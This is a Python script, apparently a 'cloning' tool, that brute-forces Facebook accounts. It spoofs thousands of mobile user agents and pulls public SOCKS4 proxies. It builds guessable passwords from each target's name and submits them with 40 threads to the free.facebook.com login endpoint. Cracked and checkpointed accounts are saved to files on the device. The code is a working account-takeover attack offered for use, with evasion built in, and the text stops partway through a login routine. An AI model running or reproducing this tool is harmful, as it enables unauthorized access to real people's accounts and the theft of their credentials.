# SCRIPTS CREATE BY HABIB HOSSAIN 
# SCRIPTS GIFT FOR EVERYONE
# UPDATE KORE NIBEN
#--------------------• IMPORT •--------------------#
import os,sys,rich,bs4,json,re,random,requests,time,datetime,os,requests,json,time,re,random,sys,uuid,string,subprocess
try:
	from time import sleep
	from bs4 import BeautifulSoup as sop
	from concurrent.futures import ThreadPoolExecutor as tred 
except ModuleNotFoundError:
	print(f'➤➤ MISSING MODELS INSTALLING ');os.system('pip install rich');os.system('pip install requests');os.system('pip install bs4')
except:pass
#--------------------• LOOP •--------------------#
pwpluss,pwnya,dump,id,id2,tokenku,method,loop,oks,cps=[],[],[],[],[],[],[],0,0,0
rc = random.choice;rr = random.randint
ugen =[];user=[]
#--------------------• COLOUR •--------------------#
G="\x1b[38;5;46m";W="\x1b[38;5;15m";B="\x1b[38;5;8m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\x1b[38;5;160m";O="\x1b[38;5;81m";X="\x1b[38;5;205m";P="\033[0;34m"
#--------------------• STYLE •--------------------#
xd=f"{W}<|{G}•{W}|>{W}";xd1=f"{W}<|{G}1{W}|>{W}";xd2=f"{W}<|{G}2{W}|>{W}";xd3=f"{W}<|{G}3{W}|>{W}";xd4=f"{W}<|{G}4{W}|>{W}";xd5=f"{W}<|{G}5{W}|>{W}";xd6=f"{W}<|{G}6{W}|>{W}";xd7=f"{W}<|{G}7{W}|>{W}";xd8=f"{W}<|{G}8{W}|>{W}";xd0=f"{W}<|{G}0{W}|>{W}";xdx=f"{W}<|{G}?{W}|>{W}";xdxx=f"{G}:{W}"
#--------------------• CLEAR •--------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{W}──────────────────────────────────────────────────')
#--------------------• PROXY •--------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('Proksi.txt','w').write(prox)
except Exception as e:
	print(e)
#--------------------• USER AGENT FOR HOST METHOD •--------------------#
for SHAHO in range(5000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
for xffd in range(1000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)
for ran in range(1000):
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for SHAHO1 in range(1000):
	model=random.choice(["V2232A","V2060","vivo Y97 Build/O11019","vivo Y17 Build/PPR1.180610.011","V1930A Build/PKQ1.190616.001","V2164KA","V1816A Build/PKQ1.180819.001","V2249","V2040","V2030","V2029","vivo 1610 Build/MMB29M","vivo 2018","vivo 1814 Build/O11019","V2244A"])
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {model}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 VivoBrowser/{random.randrange(6,18)}.{random.randrange(6,10)}.0.{random.randrange(6,10)}"
	ugen.append(ua)
for SHAHO2 in range(1000):
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; STELLAR P6 Build/SP1A.{random.randrange(111111,999999)}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for SHAHO3 in range(1000):
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; Infinix X680B Build/QP1A.{random.randrange(111111,999999)}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for SHAHO4 in range(1000):
	v=random.randrange(111111,999999)
	fb=random.choice([f"STELLAR P6|SP1A.{v}.016","SHIELD|LMY47N",f"6002A|RP1A.{v}.011",f"AKUS PRO|QP1A.{v}.020","MX-A10R|S00812",f"iT-KSA0012|PPR1.{v}.011",f"Nokia C2|PPR1.{v}.011",f"MT10|TQ1A.{v}.002.A1",f"ZTE A2023PG|SKQ1.{v}.001","iris65|O11019",f"Hisense Infinity H50S 5G|RP1A.{v}.011",f"itel A661WP|RP1A.{v}.001",f"itel A611W|RP1A.{v}.001",f"itel W5008|OPM2.{v}.012","Flare_S7_Mini|O21019","Flare_J2_Max|O21019","BBC100-1|NMF26F",f"itel W5008|OPM2.{v}.012",f"itel A632W|SP1A.{v}.016",f"Hisense V50|RP1A.{v}.001"])
	mdl,bld=fb.split('|')
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {mdl} Build/{bld}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,200)}.0.{random.randrange(4200,4900)}.{random.randrange(40,200)} Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for SHAHO5 in range(1000):
	ua=f"Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_0_1 like Mac OS X; en_US) AppleWebKit (KHTML, like Gecko) Mobile [FBAN/FBForIPhone;FBAV/4.1;FBBV/{random.randrange(1111,4100)}.0;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/5.0.1;FBSS/2; FBCR/Three;FBID/phone;FBLC/en_US;FBSF/2.0]"
	ugen.append(ua)
for SHAHO6 in range(1000):
	ua=f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/{random.randrange(100,500)}.1.0.{random.randrange(20,100)}.{random.randrange(80,200)};FBBV/{random.randrange(111111111,999999999)};FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/{random.randrange(111111111,999999999)}]"
	ugen.append(ua)
for SHAHO7 in range(1000):
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; CPH1937 Build/PKQ1.{random.randrange(111111,999999)}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for SHAHO8 in range(1000):
	mdl=random.choice(["RMX2155","RMX3085","RMX2151","RMX3286"])
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {mdl} Build/QP1A.{random.randrange(111111,999999)}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(80,500))}.0.0.{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
for SHAHO9 in range(1000):
	mdl=random.choice(['CPH1114','CPH1235','CPH1451','CPH1615','CPH1664','CPH1869','CPH1929','CPH1985','CPH2048','CPH2068','CPH2107','CPH2238','CPH2261','CPH2331','CPH2332','CPH2351','CPH2381','CPH2389','CPH2399','CPH2401','CPH2409','CPH2411','CPH2413','CPH2415','CPH2417','CPH2419','CPH2423','CPH2447','CPH2449','CPH2451','CPH2459','CPH2465','CPH2467','CPH2469','CPH2487','CPH2491','CPH2493','CPH2499','CPH2513','CPH2515','CPH2519','CPH2521','CPH2523','CPH2525','CPH2529','CPH2551','CPH2553','CPH2557','CPH2569','CPH2579','CPH2581','CPH2583','CPH2589','CPH2591','CPH2599','CPH2607','CPH2609','CPH2611','CPH2617','CPH2643','CPH3475','CPH3669','CPH3682','CPH3731','CPH3776','CPH3785','CPH4125','CPH4275','CPH4299','CPH4395','CPH4473','CPH4987','CPH5286','CPH5841','CPH5947','CPH6178','CPH6244','CPH6271','CPH6316','CPH6519','CPH6528','CPH6697','CPH7338','CPH7364','CPH7382','CPH7532','CPH7577','CPH7948','CPH7991','CPH8153','CPH8346','CPH8347','CPH8363','CPH8393','CPH8467','CPH8472','CPH8534','CPH8686','CPH8893','CPH9177','CPH9226','CPH9659','CPH9667','CPH9716','CPH9763','CPH9839','CPH9929','R830','R830S','R833T','R9','R9 Plus','R9km','R9s','R9s Plus','R9t','R9tm','Real','Reno','Reno 10','Reno 10 5G','Reno 10 Pro 5G','Reno 10 Pro+ 5G','Reno 10X','Reno 10X Zoom','Reno 2','Reno 2F','Reno 2Z','Reno 3','Reno 3 5G','Reno 3 Lite','Reno 3 Pro','Reno 3A','Reno 4 4G','Reno 4 5G','Reno 4 Lite','Reno 4 Pro 4G','Reno 4 Pro 5G','Reno 4 SE 5G','Reno 4F','Reno 4Z 5G','Reno 5','Reno 5 5G','Reno 5 Lite','Reno 5 Pro 5G','Reno 5 Pro Plus 5G','Reno 5A','Reno 5F','Reno 5G','Reno 5K','Reno 5K 5G','Reno 5Z','Reno 6','Reno 6 Pro','Reno 6 Pro 5G','Reno 6 Pro Plus','Reno 6 Z 5G','Reno 7','Reno 7 Pro','Reno 7 SE','Reno 7A','Reno 7Z','Reno 8','Reno 8 Pro','Reno 8 Pro+','Reno 8 Z','Reno 8T','Reno 9'])
	ua=f"Mozilla/5.0 (Linux; Android {random.randrange(6,13)}; {mdl} Build/RP1A.{random.randrange(111111,999999)}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(73,100)}.0.{random.randrange(4200,4900)}.{random.randrange(40,150)} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{str(random.randint(10,100))}.{str(random.randint(60,150))};]"
	ugen.append(ua)
#-------• USER AGENT FOR GRAPH & API METHOD--------------------#
def __SEX__():
	bal = "[FBAN/FB4A;FBAV/36.0.0.2619;FBBV/8821271;[FBAN/FB4A;FBAV/470.0.0.46.109;FBBV/630169011;FBDM/{density=1.0,width=1920,height=1080};FBLC/en_US;FBRV/452416153;FBCR/Banglalink;FBMF/Windows;FBBD/Windows;FBPN/com.facebook.katana;FBDV/DellXPS13;FBSV/10.0;FBOP/19;FBCA/arm64-v8a:;]"
	ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + bal
	return ua
	#━━━━━━━━[ OLD UA ]━━━━━━━━#

def windows():

    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
	#-----------------------• USER AGENT •-----------------------#

def ___new_up___():

	mix = random.choice(["SM-T835","SM-S901U","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F","CPH2083","CPH2235", "CPH2499","CPH2185","CPH2065","CPH2197","CPH1989","CPH2145","F1w","CPH1909","CPH2065","CPH1937","CPH2095","CPH2083","CPH2249","CPH2083","CPH2239","CPH1979","CPH2067","CPH2069","CPH2239","CPH2015","CPH2021","CPH2205","CPH2069","CPH2161","CPH2207","CPH2239","CPH1909","CPH2185","CPH2127","CPH1923","CPH1931","PHN110", "CPH2599", "CPH2499", "CPH2557", "CPH8686", "CPH9177", "CPH9226", "OPPO F1 Plus", "CPH2071", "PCHM00", "CPH2083", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH2477", "CPH2471", "CPH2591", "CPH1923", "CPH1925", "CPH1837", "OPPO A30","RMX1945", "RMX1911", "RMX2193", "RMX1945", "RMX1931", "RMX2170", "RMX3201", "RMX2180", "RMX2021", "RMX2020", "RMX2155", "RMX1921", "RMX2156", "RMX3363", "RMX3081", "RMX2001", "RMX2001", "RMX3263", "RMX2155", "RMX2001", "RMX3195", "RMX1945", "RMX1945", "RMX1993","vi"+"vo 1901","V2"+"026","V20"+"58","viv"+"o 1716","vi"+"vo 1808","vi"+"vo 1935","vi"+"vo 1951","vi"+"vo 1906","vivo 1808","vivo 1920","vivo 1901", "V2026","V2058","vivo 1716","vivo 1935","vivo 1951","vivo 1906","V2111","vivo 1915","V1911A","V2036","vivo 1907","vivo 1906","vivo 1915","V2025","vivo 1820","vivo 1904","vivo 1901","V1955A","LG-H342","Redmi Note 4", "Redmi 4X", "Redmi 3", "Redmi 4", "Redmi 3X", "Redmi Note 7", "Redmi 6A", "Redmi Note 8 Pro", "Redmi 5A", "Redmi 5", "Redmi 6 Pro", "Redmi Note 5", "Redmi Note 4", "Redmi Y2", "Redmi 7A", "Redmi Note 7S", "Redmi Note 8T", "Redmi Note 8 Pro", "M2003J15SC", "Redmi 5 Plus", "Redmi Note 9 Pro", "Redmi Note 9S", "LDN-L21", "M2103K19G","RMX1945","RMX1911","RMX2193","RMX1945","RMX1931","RMX2170","RMX3201","RMX2180","RMX2021","RMX2020","RMX2155","RMX1921","RMX2156","RMX3363","RMX3081","RMX2001","RMX2001","RMX3263","RMX2155","RMX2001","RMX3195","RMX1945","RMX1945","RMX1993","RMX2180","RMX3630","RMX3686","RMX1805","RMX1801","RMX2020","RMX1811","RMX3063","RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921","vivo 1906","vivo 1904","vivo Y13L","vivo 1901","V2120","V2204","vivo 1902","V2310","V2333","vivo 1929","vivo 1915","vivo 1811","V2027","V2043","V2038","V2111","V2110","V2206","V2207","vivo Y23L","V2249","vivo 1613","vivo Y28L","vivo 1938","PADM00","CPH1837","PADT00","CPH1803","CPH1853","CPH1805","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH1909","CPH1901","PDBM00","CPH1941","CPH2179","CPH2083","CPH2185","CPH2185","CPH2477","CPH2591","CHP2219","CPH1923","CPH2213","CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"])
	fban = random.choice(["FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fb_ver_code = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0','1.7','2.0','2.25','2.5','3.0','3.5'])
	width = random.randint(720, 1440)
	height = random.randint(1080, 2560)
	fblc = random.choice(["en_US","en_GB"])
	sim_name = random.choice(['Banglalink','Robi','MTN-CG','Grameenphone','Artel','Teletalk'])
	fbpn = random.choice(["com.facebook.katana"])
	fbmf = 'Xiaomi'
	fbbd = 'Redmi'
	mobile_model = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
	modelx = random.choice(["24053PY09C","2312CRNCCL","21081111RG","MI 2","M1903F10I","M1903F11I","Redmi 9T","M2006C3LII","M2004J19G","M1804C3DG","Redmi 4 Pro"])
	last = f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fb_ver_code};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{sim_name};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{modelx};FBSV/{mobile_model};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {mix} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+last
	return ua
#--------------------• COLOUR •--------------------#
logo = f"""
       {W} _______     ____  ____  
       {G}|_   __ \   |_  _||_  _|
       {W}  | |__) |    \ \  / /
       {G}  |  __ /      > `' < 
       {W} _| |  \ \_  _/ /'`\ \_  
       {G}|____| |___||____||____|  
{W}──────────────────────────────────────────────────
{xd} DEVELOPER {W} SH{W}A{W}HO-XD
{xd} TOOLS     {W} RANDOM X{B} FILE{W}|{W}CLONING
{W}──────────────────────────────────────────────────"""
#--------------------• MENU •--------------------#
os.system('espeak -a 300 "installing starting free hack "')
os.system('espeak -a 300 "author GAMING SHAHO "')
os.system('espeak -a 300 "Whatsapp 01951153459 "')
os.system('espeak -a 300 "version 1.0 "')
os.system('espeak -a 300 "from bangladesh "')
os.system('espeak -a 300 "tool random x file "')
os.system('espeak -a 300 "enjoy all brother "')
    #====SCRIPT PASSWORD SYSTEM===


import getpass

attemps = 0

while attemps < 12345677901:
    username = input(' \033[0;92mENTER USERNAME: ')
    password = input(' \033[0;93mENTER PASSWORD: ')

    if username == 'HUNT' and password == 'FB':
        os.system('espeak -a 300 "login successfully"')
        break
    else:
        os.system('espeak -a 300 "WRONG PASSWORD KHANKI"')
        attemps += 1
        continue
os.system('clear')
def ___SHAHO___():
	clear();print(f"{xd1} START FILE CLONING ");print(f"{xd2} START RANDOM CLONING ");print(f"{xd3} START GMAIL CLONING ");print(f"{xd0} EXIT CLONING ");linex();chude = input(f'{xdx} SELECT {xdxx} ')
	if chude in ["1"]:___filex___()
	elif chude in ["2"]:___randomx___()
	elif chude in ["3"]:___gamilx___()
	elif chude in ["0"]:exit()
	else:linex();print(f'{xd} OPTION NOT FOUND ');linex();time.sleep(1);print(f"{xd} TRY AGAIN SAWAR NATI");time.sleep(1);___SHAHO___()
#--------------------• FILE INPUT •--------------------#
def ___filex___():
	try:
		clear();print(f"{xd} EXAMPLE {xdxx} /sdcard/nunu.txt");linex();chude = input(f'{xdx} SELECT  {xdxx} ')
		for line in open(chude, 'r').readlines():
			id.append(line.strip())
		methodx()
	except IOError:
		linex();print(f"{xd} FILE OPTION NOT FOUND BRO ");sleep(1);___filex___()
#--------------------• METHOD •--------------------#
def methodx():
	for bacot in id:
		xx = rr(0,len(id2))
		id2.insert(xx,bacot)
	clear();print(f"{xd1} METHOD M1 ");print(f"{xd2} METHOD M2 ");linex();methdxd = input(f'{xdx} SELECT {xdxx} ')
	if methdxd in ['1']:method.append('M1')
	elif methdxd in ['2']:method.append('M2')
	else:method.append('M1')
	passwordx()
#--------------------• PASSWORD SYSTEM •--------------------#
def passwordx():
	clear();print(f'{xd} TOTAL FILE UID {xdxx} {str(len(id))} ');print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
	with tred(max_workers=40) as __SHAHO__:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = [frs+'123',frs+'12345']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'111')
					pwv.append(frs+'@#')
					pwv.append(frs+'@@##')
					pwv.append(frs+'##')
					pwv.append(frs+'###')
					pwv.append(frs+'@123')
					pwv.append(frs+'1122')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'12')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'@')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'111')
					pwv.append(frs+'@#')
					pwv.append(frs+'@@##')
					pwv.append(frs+'##')
					pwv.append(frs+'###')
					pwv.append(frs+'@123')
					pwv.append(frs+'1122')
			if 'M1' in method:__SHAHO__.submit(___M1___,idf,pwv)
			elif 'M2' in method:__SHAHO__.submit(___M2___,idf,pwv)
			else:__SHAHO__.submit(___M1___,idf,pwv)
#--------------------• FILE METHOD M1 •--------------------#
def ___M1___(idf,pwv):
    global loop,oks,cps
    sys.stdout.write(f'\r{W}<|{G}FILE-M1{W}|>{W} {loop}{G}|{W}{oks}{G}|{W}{cps} ');sys.stdout.flush()
    ua = random.choice(ugen)
    ses = requests.Session()
    for pw in pwv:
        try:
            ses.headers.update({"Host":'free.facebook.com',
            "upgrade-insecure-requests":"1",
            "user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "dnt":"1","x-requested-with":"mark.via.gp",
            "sec-fetch-site":"same-origin","sec-fetch-mode":"cors",
            "sec-fetch-user":"empty",
            "sec-fetch-dest":"document",
            "referer":"https://free.facebook.com/",
            "accept-encoding":"gzip, deflate br",
            "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r{W}<|{R}SHAHO-CP{W}|>{R} {idf} | {pw} ')
                open('/sdcard/SHAHO-M1-FILE-CP.txt','a').write(idf+'|'+pw+'\n')
                cps+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                oks+=1
